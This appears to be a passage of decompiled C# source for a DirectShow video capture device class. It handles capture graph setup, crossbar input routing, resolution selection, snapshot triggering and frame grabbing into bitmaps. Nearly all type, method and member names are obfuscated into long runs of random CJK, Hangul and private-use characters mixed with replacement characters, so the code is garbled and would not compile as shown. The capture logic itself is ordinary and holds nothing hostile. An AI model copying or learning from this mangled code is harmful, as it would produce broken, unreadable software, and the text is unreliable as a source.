          this.GetPinCapabilitiesAndConfigureSizeAndRate(graphBuilder1, ᯥ䳿ᳱ厗ᮗ埕駮푭폏ꤩ帴짱믐4, \uA635湈붺䮘㔊谋蓝巉\u2E07繸ব繑㶻\uF513Ꮏ䓷咻賑\u2621䬣.佌听\uE545쾘뽠鱇묺鑱鋋\uFFFD\uF681눫ࠜ\u33A0ꊀ䀫鬏鐫띩ᯋ, this.snapshotResolution, ref this.snapshotCapabilities);
        else
          this.snapshotCapabilities = new \uE7FA\uFF5D逸䤈䡜蛷\uF717\u3309ﱈ䠎\uFFFD碛湺欘ቓ躪항睾㰲\uF5BB[0];
        lock (VideoCaptureDevice.cacheVideoCapabilities)
        {
          if (this.videoCapabilities != null)
          {
            if (!VideoCaptureDevice.cacheVideoCapabilities.ContainsKey(this.deviceMoniker))
              VideoCaptureDevice.cacheVideoCapabilities.Add(this.deviceMoniker, this.videoCapabilities);
          }
        }
        lock (VideoCaptureDevice.cacheSnapshotCapabilities)
        {
          if (this.snapshotCapabilities != null)
          {
            if (!VideoCaptureDevice.cacheSnapshotCapabilities.ContainsKey(this.deviceMoniker))
              VideoCaptureDevice.cacheSnapshotCapabilities.Add(this.deviceMoniker, this.snapshotCapabilities);
          }
        }
        if (runGraph)
        {
          graphBuilder1.RenderStream(\uA635湈붺䮘㔊谋蓝巉\u2E07繸ব繑㶻\uF513Ꮏ䓷咻賑\u2621䬣.ꇜ\uE89D\u2BB3暇捱뽺\uEAECⶼ\uF49A礃豾\uE3A5﨏쪥挛\u23AA\uF3BC\u2A89롆ꆛ, 蔻믠\uF06D쏀퀨흔\u23BDӏ씤崞뼜\u327D\u22FD佅橵갰햲䠋ᙝ\uE149.\uE49E锫\u2F70ꨕ笳ī\uEF88\u20CB\uE537ﾶꤹ뇬ꧮ轢金\uE47Dܨ\uFDE5\uF6B6̧, (object) ᯥ䳿ᳱ厗ᮗ埕駮푭폏ꤩ帴짱믐4, (ᯥ\uFFFD䳿\u109Eᳱ厗ᮗ\u2F3A\u061E\uFBCD埕駮푭폏ꤩ帴짱믐\u260B\uEE67) null, ᯥ䳿ᳱ厗ᮗ埕駮푭폏ꤩ帴짱믐5);
          if (obj4.GetConnectedMediaType(mediaType) == 0)
          {
            \uFFFDɨޜ뎷洚閧퐥\u2570ө褏돘䍄楺\uF2F9옹ㆋ䩮粛ʪῈ structure = (\uFFFDɨޜ뎷洚閧퐥\u2570ө褏돘䍄楺\uF2F9옹ㆋ䩮粛ʪῈ) Marshal.PtrToStructure(mediaType.FormatPtr, typeof (\uFFFDɨޜ뎷洚閧퐥\u2570ө褏돘䍄楺\uF2F9옹ㆋ䩮粛ʪῈ));
            callback1.Width = structure.\u0831\uA4BB筚뵥裗\uF2EF师\u328E囚꽏\uFFFD㝽牖侷壘練翓똿嫘깗.學遊\uFFFD\u1CA4ꄛ\u2388鍷讲\uE852㶱㽑\uFF0A㫲\uEC26ܵⱾ펥듧\u24E9䌉;
            callback1.Height = structure.\u0831\uA4BB筚뵥裗\uF2EF师\u328E囚꽏\uFFFD㝽牖侷壘練翓똿嫘깗.䇩鳔ᴊ뜬ᢱ\uE9F9ﴚ挚鉨鬒\uFFFD雈䕋눨\u2729Ḇ\uFDE4\u0B8D\uF789㲆;
            mediaType.Dispose();
          }
          if (flag && this.provideSnapshots)
          {
            graphBuilder1.RenderStream(\uA635湈붺䮘㔊谋蓝巉\u2E07繸ব繑㶻\uF513Ꮏ䓷咻賑\u2621䬣.佌听\uE545쾘뽠鱇묺鑱鋋\uFFFD\uF681눫ࠜ\u33A0ꊀ䀫鬏鐫띩ᯋ, 蔻믠\uF06D쏀퀨흔\u23BDӏ씤崞뼜\u327D\u22FD佅橵갰햲䠋ᙝ\uE149.\uE49E锫\u2F70ꨕ笳ī\uEF88\u20CB\uE537ﾶꤹ뇬ꧮ轢金\uE47Dܨ\uFDE5\uF6B6̧, (object) ᯥ䳿ᳱ厗ᮗ埕駮푭폏ꤩ帴짱믐4, (ᯥ\uFFFD䳿\u109Eᳱ厗ᮗ\u2F3A\u061E\uFBCD埕駮푭폏ꤩ帴짱믐\u260B\uEE67) null, ᯥ䳿ᳱ厗ᮗ埕駮푭폏ꤩ帴짱믐6);
            if (obj5.GetConnectedMediaType(mediaType) == 0)
            {
              \uFFFDɨޜ뎷洚閧퐥\u2570ө褏돘䍄楺\uF2F9옹ㆋ䩮粛ʪῈ structure = (\uFFFDɨޜ뎷洚閧퐥\u2570ө褏돘䍄楺\uF2F9옹ㆋ䩮粛ʪῈ) Marshal.PtrToStructure(mediaType.FormatPtr, typeof (\uFFFDɨޜ뎷洚閧퐥\u2570ө褏돘䍄楺\uF2F9옹ㆋ䩮粛ʪῈ));
              callback2.Width = structure.\u0831\uA4BB筚뵥裗\uF2EF师\u328E囚꽏\uFFFD㝽牖侷壘練翓똿嫘깗.學遊\uFFFD\u1CA4ꄛ\u2388鍷讲\uE852㶱㽑\uFF0A㫲\uEC26ܵⱾ펥듧\u24E9䌉;
              callback2.Height = structure.\u0831\uA4BB筚뵥裗\uF2EF师\u328E囚꽏\uFFFD㝽牖侷壘練翓똿嫘깗.䇩鳔ᴊ뜬ᢱ\uE9F9ﴚ挚鉨鬒\uFFFD雈䕋눨\u2729Ḇ\uFDE4\u0B8D\uF789㲆;
              mediaType.Dispose();
            }
          }
          \uFFFD\uE49D\uFB0Fⷈ\uFFFDꇾ닫\uF0EA킞\u2878ⵄ摥\u2DC7犑럁\u17FB쬰긶幗\uFFFD ⷈꇾ닫킞ⵄ摥犑럁쬰긶幗2 = (\uFFFD\uE49D\uFB0Fⷈ\uFFFDꇾ닫\uF0EA킞\u2878ⵄ摥\u2DC7犑럁\u17FB쬰긶幗\uFFFD) o2;
          漣獷鶣\u2E3Dᜈ鮕ု論唅覂왁쑗ꊬꇧꉴ愻㳜ើ羽\uFFFD 漣獷鶣ᜈ鮕ု論唅覂왁쑗ꊬꇧꉴ愻㳜ើ羽2 = (漣獷鶣\u2E3Dᜈ鮕ု論唅覂왁쑗ꊬꇧꉴ愻㳜ើ羽\uFFFD) o2;
          ⷈꇾ닫킞ⵄ摥犑럁쬰긶幗2.Run();
          if (flag && this.provideSnapshots)
          {
            this.startTime = DateTime.Now;
            秎윹ɖ紒뱤퓯Ø歛猲炖噙음뇔쟘錘席䃲꾀.SetMode(pin, ꏫ㹔棥蛱㖳矊ꬡ鸛\u2152嵝컣菠馺䀕㔏\uEB90ﷆ愿\uFF20臰.券\uE0D2\uE037쐰昑㴣\uEDF7\u21BB\u1717\uFFFD\u2117\uECAE誔ﻹ\uE4DB枫鉔湇矂\u2B7A);
          }
          do
          {
            \uF869㹾쭓濋꣄\uFFFD钄僲ਨ斂蘤骽\u33A3〣椗쭧\u2204턯왛闛 lEventCode;
            IntPtr lParam1;
            IntPtr lParam2;
            if (漣獷鶣ᜈ鮕ု論唅覂왁쑗ꊬꇧꉴ愻㳜ើ羽2 != null && 漣獷鶣ᜈ鮕ု論唅覂왁쑗ꊬꇧꉴ愻㳜ើ羽2.GetEvent(out lEventCode, out lParam1, out lParam2, 0) >= 0)
            {
              漣獷鶣ᜈ鮕ု論唅覂왁쑗ꊬꇧꉴ愻㳜ើ羽2.FreeEventParams(lEventCode, lParam1, lParam2);
              if (lEventCode == \uF869㹾쭓濋꣄\uFFFD钄僲ਨ斂蘤骽\u33A3〣椗쭧\u2204턯왛闛.썠릨\u1FF0죚悔ﵐ㪾ﭙ쮰畞ۈ\uFFFD\u9FFAﵝ퇟徽뇶㭰鎕椲)
              {
                reason = 可喣ꢩ垉\uF16C텞辂ᳩ\u229B싻晀ֵ륊ꪵ뼵씇蕅Ⰱ\u2F31ᆋ.겊켠薌ꎺ떁ᣡⴻ\u2195쵀過\u2079\uE6CEﮂག\uFFFD뗚횫ﱟꁮ\uF3F5;
                break;
              }
            }
            if (this.needToSetVideoInput)
            {
              this.needToSetVideoInput = false;
              if (this.isCrossbarAvailable.Value)
              {
                this.SetCurrentCrossbarInput(ᆭ㾝硠䀹ꉾ댞住ﺷᐧાW睘龟퀮, this.crossbarVideoInput);
                this.crossbarVideoInput = this.GetCurrentCrossbarInput(ᆭ㾝硠䀹ꉾ댞住ﺷᐧાW睘龟퀮);
              }
            }
            if (this.needToSimulateTrigger)
            {
              this.needToSimulateTrigger = false;
              if (flag && this.provideSnapshots)
                秎윹ɖ紒뱤퓯Ø歛猲炖噙음뇔쟘錘席䃲꾀.SetMode(pin, ꏫ㹔棥蛱㖳矊ꬡ鸛\u2152嵝컣菠馺䀕㔏\uEB90ﷆ愿\uFF20臰.\uE116檚ၝᚚ\uFFFD䓒궫\uFFFD묐灿ퟎ桔ꆗ\u3363뀯叧羓‮氏㙢);
            }
            if (this.needToDisplayPropertyPage)
            {
              this.needToDisplayPropertyPage = false;
              this.DisplayPropertyPage(this.parentWindowForPropertyPage, this.sourceObject);
              if (ᆭ㾝硠䀹ꉾ댞住ﺷᐧાW睘龟퀮 != null)
                this.crossbarVideoInput = this.GetCurrentCrossbarInput(ᆭ㾝硠䀹ꉾ댞住ﺷᐧાW睘龟퀮);
            }
            if (this.needToDisplayCrossBarPropertyPage)
            {
              this.needToDisplayCrossBarPropertyPage = false;
              if (ᆭ㾝硠䀹ꉾ댞住ﺷᐧાW睘龟퀮 != null)
              {
                this.DisplayPropertyPage(this.parentWindowForPropertyPage, (object) ᆭ㾝硠䀹ꉾ댞住ﺷᐧાW睘龟퀮);
                this.crossbarVideoInput = this.GetCurrentCrossbarInput(ᆭ㾝硠䀹ꉾ댞住ﺷᐧાW睘龟퀮);
              }
            }
          }
          while (!this.stopEvent.WaitOne(100, false));
          ⷈꇾ닫킞ⵄ摥犑럁쬰긶幗2.Stop();
        }
      }
      catch (Exception ex)
      {
        if (this.VideoSourceError != null)
          this.VideoSourceError((object) this, new \u2002䘒ⶆ动ĺਿ잃\uE18F괕燬\uEBB6\uFBB2\uEB73꾐싀ꄑ굝겿홿ଊ(ex.Message));
      }
      finally
      {
        魑헃磺嵪뤄氽䁤䬧냽蠬豟१鳕᪆ = (\uFDDC\u2F9F魑\uFFFD헃磺嵪뤄氽䁤䬧냽蠬豟१鳕᪆\uF70F\uF3FD\uFFFD) null;
        obj1 = (\u20E6詫ꅳ糙ᬛ憂祂埖Ű呧酞\uF670\uEB8A瑜溢\uECE6䑵淐跏ﯥ) null;
        ᯥ䳿ᳱ厗ᮗ埕駮푭폏ꤩ帴짱믐1 = (ᯥ\uFFFD䳿\u109Eᳱ厗ᮗ\u2F3A\u061E\uFBCD埕駮푭폏ꤩ帴짱믐\u260B\uEE67) null;
        ⷈꇾ닫킞ⵄ摥犑럁쬰긶幗1 = (\uFFFD\uE49D\uFB0Fⷈ\uFFFDꇾ닫\uF0EA킞\u2878ⵄ摥\u2DC7犑럁\u17FB쬰긶幗\uFFFD) null;
        漣獷鶣ᜈ鮕ု論唅覂왁쑗ꊬꇧꉴ愻㳜ើ羽1 = (漣獷鶣\u2E3Dᜈ鮕ု論唅覂왁쑗ꊬꇧꉴ愻㳜ើ羽\uFFFD) null;
        ᯥ䳿ᳱ厗ᮗ埕駮푭폏ꤩ帴짱믐2 = (ᯥ\uFFFD䳿\u109Eᳱ厗ᮗ\u2F3A\u061E\uFBCD埕駮푭폏ꤩ帴짱믐\u260B\uEE67) null;
        ᯥ䳿ᳱ厗ᮗ埕駮푭폏ꤩ帴짱믐3 = (ᯥ\uFFFD䳿\u109Eᳱ厗ᮗ\u2F3A\u061E\uFBCD埕駮푭폏ꤩ帴짱믐\u260B\uEE67) null;
        obj2 = (\u0BEA\uF397欫艎뭕\u2FF0蓈Ėᡙ艹偌퍆嗘홦\uEA49随奉尤\uEA74熯) null;
        obj3 = (\u0BEA\uF397欫艎뭕\u2FF0蓈Ėᡙ艹偌퍆嗘홦\uEA49随奉尤\uEA74熯) null;
        if (o2 != null)
          Marshal.ReleaseComObject(o2);
        if (this.sourceObject != null)
        {
          Marshal.ReleaseComObject(this.sourceObject);
          this.sourceObject = (object) null;
        }
        if (o3 != null)
          Marshal.ReleaseComObject(o3);
        if (o4 != null)
          Marshal.ReleaseComObject(o4);
        if (o1 != null)
          Marshal.ReleaseComObject(o1);
        if (retInterface != null)
          Marshal.ReleaseComObject(retInterface);
      }
      if (this.PlayingFinished == null)
        return;
      this.PlayingFinished((object) this, reason);
    }

    private void SetResolution(
      숃ꃬ젝\uFFFDꏓ杚襟ŨႹ\uE52E㫙诮蠒犮캂版ꂺ䐌䢯뫖 streamConfig,
      \uE7FA\uFF5D逸䤈䡜蛷\uF717\u3309ﱈ䠎\uFFFD碛湺欘ቓ躪항睾㰲\uF5BB resolution)
    {
      if (\uE7FA\uFF5D逸䤈䡜蛷\uF717\u3309ﱈ䠎\uFFFD碛湺欘ቓ躪항睾㰲\uF5BB.魃復\uF1F0颔깦鲞둡㳡\uE521\uEE09\uF72Fꅥ\u222C\uE7CB\u0A54迦䬢퍯뷒㳨(resolution, (\uE7FA\uFF5D逸䤈䡜蛷\uF717\u3309ﱈ䠎\uFFFD碛湺欘ቓ躪항睾㰲\uF5BB) null))
        return;
      int count = 0;
      int size = 0;
      AMMediaType mediaType = (AMMediaType) null;
      \uFFFD்\uE696ﭣঢ\uE996ꬢ埕䐱霕ꇻ큔圥㵠\uFE62뤒\u2300Џ\uEA24䨮 streamConfigCaps = new \uFFFD்\uE696ﭣঢ\uE996ꬢ埕䐱霕ꇻ큔圥㵠\uFE62뤒\u2300Џ\uEA24䨮();
      streamConfig.GetNumberOfCapabilities(out count, out size);
      for (int index = 0; index < count; ++index)
      {
        try
        {
          \uE7FA\uFF5D逸䤈䡜蛷\uF717\u3309ﱈ䠎\uFFFD碛湺欘ቓ躪항睾㰲\uF5BB b = new \uE7FA\uFF5D逸䤈䡜蛷\uF717\u3309ﱈ䠎\uFFFD碛湺欘ቓ躪항睾㰲\uF5BB(streamConfig, index);
          if (\uE7FA\uFF5D逸䤈䡜蛷\uF717\u3309ﱈ䠎\uFFFD碛湺欘ቓ躪항睾㰲\uF5BB.魃復\uF1F0颔깦鲞둡㳡\uE521\uEE09\uF72Fꅥ\u222C\uE7CB\u0A54迦䬢퍯뷒㳨(resolution, b))
          {
            if (streamConfig.GetStreamCaps(index, out mediaType, streamConfigCaps) == 0)
              break;
          }
        }
        catch
        {
        }
      }
      if (mediaType == null)
        return;
      streamConfig.SetFormat(mediaType);
      mediaType.Dispose();
    }

    private void GetPinCapabilitiesAndConfigureSizeAndRate(
      \uFDDC\u2F9F魑\uFFFD헃磺嵪뤄氽䁤䬧냽蠬豟१鳕᪆\uF70F\uF3FD\uFFFD graphBuilder,
      ᯥ\uFFFD䳿\u109Eᳱ厗ᮗ\u2F3A\u061E\uFBCD埕駮푭폏ꤩ帴짱믐\u260B\uEE67 baseFilter,
      Guid pinCategory,
      \uE7FA\uFF5D逸䤈䡜蛷\uF717\u3309ﱈ䠎\uFFFD碛湺欘ቓ躪항睾㰲\uF5BB resolutionToSet,
      ref \uE7FA\uFF5D逸䤈䡜蛷\uF717\u3309ﱈ䠎\uFFFD碛湺欘ቓ躪항睾㰲\uF5BB[] capabilities)
    {
      object retInterface;
      graphBuilder.FindInterface(pinCategory, 蔻믠\uF06D쏀퀨흔\u23BDӏ씤崞뼜\u327D\u22FD佅橵갰햲䠋ᙝ\uE149.\uE49E锫\u2F70ꨕ笳ī\uEF88\u20CB\uE537ﾶꤹ뇬ꧮ轢金\uE47Dܨ\uFDE5\uF6B6̧, baseFilter, typeof (숃ꃬ젝\uFFFDꏓ杚襟ŨႹ\uE52E㫙诮蠒犮캂版ꂺ䐌䢯뫖).GUID, out retInterface);
      if (retInterface != null)
      {
        숃ꃬ젝\uFFFDꏓ杚襟ŨႹ\uE52E㫙诮蠒犮캂版ꂺ䐌䢯뫖 숃ꃬ젝ꏓ杚襟Ũⴙ㫙诮蠒犮캂版ꂺ䐌䢯뫖 = (숃ꃬ젝\uFFFDꏓ杚襟ŨႹ\uE52E㫙诮蠒犮캂版ꂺ䐌䢯뫖) null;
        try
        {
          숃ꃬ젝ꏓ杚襟Ũⴙ㫙诮蠒犮캂版ꂺ䐌䢯뫖 = (숃ꃬ젝\uFFFDꏓ杚襟ŨႹ\uE52E㫙诮蠒犮캂版ꂺ䐌䢯뫖) retInterface;
        }
        catch (InvalidCastException ex)
        {
        }
        if (숃ꃬ젝ꏓ杚襟Ũⴙ㫙诮蠒犮캂版ꂺ䐌䢯뫖 != null)
        {
          if (capabilities == null)
          {
            try
            {
              capabilities = \uE7FA\uFF5D逸䤈䡜蛷\uF717\u3309ﱈ䠎\uFFFD碛湺欘ቓ躪항睾㰲\uF5BB.\u061C䌭䉙\u2325燋鬊\u02ED㻰每ᩢ슜\uE799ᇧ\uF135蕅楧ᱽⷩ瞈㿸(숃ꃬ젝ꏓ杚襟Ũⴙ㫙诮蠒犮캂版ꂺ䐌䢯뫖);
            }
            catch
            {
            }
          }
          if (\uE7FA\uFF5D逸䤈䡜蛷\uF717\u3309ﱈ䠎\uFFFD碛湺欘ቓ躪항睾㰲\uF5BB.뿗㠸ꖾ촿䊼㥼鸸뵍㮣ꪕ컢徳賫䗾Ἡ䆠ㄕ樽㿲\u2AE1(resolutionToSet, (\uE7FA\uFF5D逸䤈䡜蛷\uF717\u3309ﱈ䠎\uFFFD碛湺欘ቓ躪항睾㰲\uF5BB) null))
            this.SetResolution(숃ꃬ젝ꏓ杚襟Ũⴙ㫙诮蠒犮캂版ꂺ䐌䢯뫖, resolutionToSet);
        }
      }
      if (capabilities != null)
        return;
      capabilities = new \uE7FA\uFF5D逸䤈䡜蛷\uF717\u3309ﱈ䠎\uFFFD碛湺欘ቓ躪항睾㰲\uF5BB[0];
    }

    private void DisplayPropertyPage(IntPtr parentWindow, object sourceObject)
    {
      try
      {
        㝎駾嶙\u2EFA媱䥊曯㻹쾌\uECC8ʛ\u2A39ꧥ劺傏Ĩະ浪销Ṇ pPages;
        ((䚀㴹\uF85D飘獅䕎\uF2BB콇\uFDED\uE6AB糳뤅䬻\u319Eⴱ芬턜曰䭫䝘) sourceObject).GetPages(out pPages);
        FilterInfo filterInfo = new FilterInfo(this.deviceMoniker);
        ḓ袊룂蒐Ǚ륈\uEA67縓哒ᰲ씠䦬馰霡泚뚏碾ଡ厉盨.ߖ䭝嫰\uFFFD屴ᙓ圠텬\u2BE1\uA6F7Ŗ틓紐\u260B\u2584\u2A11戔뵗킄\uF197(parentWindow, 0, 0, filterInfo.Name, 1, ref sourceObject, pPages.윳ㅰ혪畵\uF522ᴸ좐\uF880旙\uE70E\uFFFD\u21D9\uF715飨\u24F5㒋鮛씽챯暫, pPages.\u4DEE鹔\u28DA竜ሉ鲠\u0B84㠦䫙嬶恻四섎롇鯔齳\uFFFDؙ\uFFFDꩆ, 0, 0, IntPtr.Zero);
        Marshal.FreeCoTaskMem(pPages.\u4DEE鹔\u28DA竜ሉ鲠\u0B84㠦䫙嬶恻四섎롇鯔齳\uFFFDؙ\uFFFDꩆ);
      }
      catch
      {
      }
    }

    private 賗㢰琩\u9FE0얧\u205D䫕㠎嶊ጚ\u2972ራ鬒\u0FEE\uA9DC麰멜䕤\u1CC4\uE205[] ColletCrossbarVideoInputs(
      ᆭ㾝硠\uEDA7\uEBB9䀹ꉾ\uE5C5댞住ﺷᐧા\uFE3Aw睘龟퀮\uE68C\u2374 crossbar)
    {
      lock (VideoCaptureDevice.cacheCrossbarVideoInputs)
      {
        if (VideoCaptureDevice.cacheCrossbarVideoInputs.ContainsKey(this.deviceMoniker))
          return VideoCaptureDevice.cacheCrossbarVideoInputs[this.deviceMoniker];
        List<賗㢰琩\u9FE0얧\u205D䫕㠎嶊ጚ\u2972ራ鬒\u0FEE\uA9DC麰멜䕤\u1CC4\uE205> 賗㢰琩얧䫕㠎嶊ጚራ鬒麰멜䕤List = new List<賗㢰琩\u9FE0얧\u205D䫕㠎嶊ጚ\u2972ራ鬒\u0FEE\uA9DC麰멜䕤\u1CC4\uE205>();
        int inputPinCount;
        if (crossbar != null && crossbar.get_PinCounts(out int _, out inputPinCount) == 0)
        {
          for (int index = 0; index < inputPinCount; ++index)
          {
            믟鏸뗁什ꠤ\uF38Fꬸ䣼酨维\uFFFD\uF020᳝輪儃熐땤\u22B2넹ᙠ physicalType;
            if (crossbar.get_CrossbarPinInfo(true, index, out int _, out physicalType) == 0 && physicalType < 믟鏸뗁什ꠤ\uF38Fꬸ䣼酨维\uFFFD\uF020᳝輪儃熐땤\u22B2넹ᙠ.\u2B8D\uD7FD劀\u339E轿帎ုخ\uFFFD\u20C3꺩ꭼ啪仠꽠瑄噲푈뉮䭓)
              賗㢰琩얧䫕㠎嶊ጚራ鬒麰멜䕤List.Add(new 賗㢰琩\u9FE0얧\u205D䫕㠎嶊ጚ\u2972ራ鬒\u0FEE\uA9DC麰멜䕤\u1CC4\uE205(index, physicalType));
          }
        }
        賗㢰琩\u9FE0얧\u205D䫕㠎嶊ጚ\u2972ራ鬒\u0FEE\uA9DC麰멜䕤\u1CC4\uE205[] array = new 賗㢰琩\u9FE0얧\u205D䫕㠎嶊ጚ\u2972ራ鬒\u0FEE\uA9DC麰멜䕤\u1CC4\uE205[賗㢰琩얧䫕㠎嶊ጚራ鬒麰멜䕤List.Count];
        賗㢰琩얧䫕㠎嶊ጚራ鬒麰멜䕤List.CopyTo(array);
        VideoCaptureDevice.cacheCrossbarVideoInputs.Add(this.deviceMoniker, array);
        return array;
      }
    }

    private 賗㢰琩\u9FE0얧\u205D䫕㠎嶊ጚ\u2972ራ鬒\u0FEE\uA9DC麰멜䕤\u1CC4\uE205 GetCurrentCrossbarInput(
      ᆭ㾝硠\uEDA7\uEBB9䀹ꉾ\uE5C5댞住ﺷᐧા\uFE3Aw睘龟퀮\uE68C\u2374 crossbar)
    {
      賗㢰琩\u9FE0얧\u205D䫕㠎嶊ጚ\u2972ራ鬒\u0FEE\uA9DC麰멜䕤\u1CC4\uE205 currentCrossbarInput = 賗㢰琩\u9FE0얧\u205D䫕㠎嶊ጚ\u2972ራ鬒\u0FEE\uA9DC麰멜䕤\u1CC4\uE205.Default;
      int outputPinCount;
      if (crossbar.get_PinCounts(out outputPinCount, out int _) == 0)
      {
        int outputPinIndex = -1;
        int pinIndexRelated;
        for (int pinIndex = 0; pinIndex < outputPinCount; ++pinIndex)
        {
          믟鏸뗁什ꠤ\uF38Fꬸ䣼酨维\uFFFD\uF020᳝輪儃熐땤\u22B2넹ᙠ physicalType;
          if (crossbar.get_CrossbarPinInfo(false, pinIndex, out pinIndexRelated, out physicalType) == 0 && physicalType == 믟鏸뗁什ꠤ\uF38Fꬸ䣼酨维\uFFFD\uF020᳝輪儃熐땤\u22B2넹ᙠ.䩷\uF774蓃覦\uF274\uFFFD\uE4E0錓䗋\u0F6E䳞䩭\uF65C맚\uFFFD뷁濠춮補Ϳ)
          {
            outputPinIndex = pinIndex;
            break;
          }
        }
        int inputPinIndex;
        if (outputPinIndex != -1 && crossbar.get_IsRoutedTo(outputPinIndex, out inputPinIndex) == 0)
        {
          믟鏸뗁什ꠤ\uF38Fꬸ䣼酨维\uFFFD\uF020᳝輪儃熐땤\u22B2넹ᙠ physicalType;
          crossbar.get_CrossbarPinInfo(true, inputPinIndex, out pinIndexRelated, out physicalType);
          currentCrossbarInput = new 賗㢰琩\u9FE0얧\u205D䫕㠎嶊ጚ\u2972ራ鬒\u0FEE\uA9DC麰멜䕤\u1CC4\uE205(inputPinIndex, physicalType);
        }
      }
      return currentCrossbarInput;
    }

    private void SetCurrentCrossbarInput(
      ᆭ㾝硠\uEDA7\uEBB9䀹ꉾ\uE5C5댞住ﺷᐧા\uFE3Aw睘龟퀮\uE68C\u2374 crossbar,
      賗㢰琩\u9FE0얧\u205D䫕㠎嶊ጚ\u2972ራ鬒\u0FEE\uA9DC麰멜䕤\u1CC4\uE205 videoInput)
    {
      int outputPinCount;
      int inputPinCount;
      if (videoInput.䅖ꠟ\uF37E㖯\uFFFD걏\u29B3䣃\uF209묯㯁\uF7F3减e䲇栀\u2854ꅪ癡鿏 == 믟鏸뗁什ꠤ\uF38Fꬸ䣼酨维\uFFFD\uF020᳝輪儃熐땤\u22B2넹ᙠ.琣炈頋\uFFFD닎㪵층뎼焤鑄鲍ꔚ䣗\u07F7䰖ᬑ鎇먈㡉楹 || crossbar.get_PinCounts(out outputPinCount, out inputPinCount) != 0)
        return;
      int outputPinIndex = -1;
      int inputPinIndex = -1;
      int pinIndexRelated;
      믟鏸뗁什ꠤ\uF38Fꬸ䣼酨维\uFFFD\uF020᳝輪儃熐땤\u22B2넹ᙠ physicalType;
      for (int pinIndex = 0; pinIndex < outputPinCount; ++pinIndex)
      {
        if (crossbar.get_CrossbarPinInfo(false, pinIndex, out pinIndexRelated, out physicalType) == 0 && physicalType == 믟鏸뗁什ꠤ\uF38Fꬸ䣼酨维\uFFFD\uF020᳝輪儃熐땤\u22B2넹ᙠ.䩷\uF774蓃覦\uF274\uFFFD\uE4E0錓䗋\u0F6E䳞䩭\uF65C맚\uFFFD뷁濠춮補Ϳ)
        {
          outputPinIndex = pinIndex;
          break;
        }
      }
      for (int pinIndex = 0; pinIndex < inputPinCount; ++pinIndex)
      {
        if (crossbar.get_CrossbarPinInfo(true, pinIndex, out pinIndexRelated, out physicalType) == 0 && physicalType == videoInput.䅖ꠟ\uF37E㖯\uFFFD걏\u29B3䣃\uF209묯㯁\uF7F3减e䲇栀\u2854ꅪ癡鿏 && pinIndex == videoInput.霮\u4DEC馅䛅퓜ᚒ\uF3F2뾊간띭\u24BA昁\u0A7CḴ\uF20B皜\uF5A1퀿띛\uFE32)
        {
          inputPinIndex = pinIndex;
          break;
        }
      }
      if (inputPinIndex == -1 || outputPinIndex == -1 || crossbar.CanRoute(outputPinIndex, inputPinIndex) != 0)
        return;
      crossbar.Route(outputPinIndex, inputPinIndex);
    }

    private void OnNewFrame(Bitmap image)
    {
      ++this.framesReceived;
      this.bytesReceived += (long) (image.Width * image.Height * (Image.GetPixelFormatSize(image.PixelFormat) >> 3));
      if (this.stopEvent.WaitOne(0, false) || this.NewFrame == null)
        return;
      this.NewFrame((object) this, new \uF02D縣涢秌\uF7E4桬㹃恹릵㫥뙡\uE766ᣝ扉䨈㪛퐿㕞꾬ሁ(image));
    }

    private void OnSnapshotFrame(Bitmap image)
    {
      if ((DateTime.Now - this.startTime).TotalSeconds < 4.0 || this.stopEvent.WaitOne(0, false) || this.SnapshotFrame == null)
        return;
      this.SnapshotFrame((object) this, new \uF02D縣涢秌\uF7E4桬㹃恹릵㫥뙡\uE766ᣝ扉䨈㪛퐿㕞꾬ሁ(image));
    }

    private class Grabber : 䝗\u2BF1跃\uED65괕ᘂ괂脴觸炊鄺㫫ᷙ㛫䮭ừ䋋盰\u20FF깔
    {
      private VideoCaptureDevice parent;
      private bool snapshotMode;
      private int width;
      private int height;

      public int Width
      {
        get => this.width;
        set => this.width = value;
      }

      public int Height
      {
        get => this.height;
        set => this.height = value;
      }

      public Grabber(VideoCaptureDevice parent, bool snapshotMode)
      {
        this.parent = parent;
        this.snapshotMode = snapshotMode;
      }

      public int SampleCB(double sampleTime, IntPtr sample) => 0;

      public unsafe int BufferCB(double sampleTime, IntPtr buffer, int bufferLen)
      {
        if (this.parent.NewFrame != null)
        {
          Bitmap image = new Bitmap(this.width, this.height, PixelFormat.Format24bppRgb);
          BitmapData bitmapdata = image.LockBits(new Rectangle(0, 0, this.width, this.height), ImageLockMode.ReadWrite, PixelFormat.Format24bppRgb);
          int stride1 = bitmapdata.Stride;
          int stride2 = bitmapdata.Stride;
          byte* dst = (byte*) ((IntPtr) bitmapdata.Scan0.ToPointer() + stride2 * (this.height - 1));
          byte* pointer = (byte*) buffer.ToPointer();
          for (int index = 0; index < this.height; ++index)
          {
            ḓ袊룂蒐Ǚ륈\uEA67縓哒ᰲ씠䦬馰霡泚뚏碾ଡ厉盨.各\uF626櫡胞\u21D9㩅臺鋻㻻鳏\u089F杛挵伥ﱾ쬿胜榬燨玅(dst, pointer, stride1);
            dst -= stride2;
            pointer += stride1;
          }
          image.UnlockBits(bitmapdata);
          if (this.snapshotMode)
            this.parent.OnSnapshotFrame(image);
          else
            this.parent.OnNewFrame(image);
          image.Dispose();
        }
        return 0;
      }
    }
  }
}
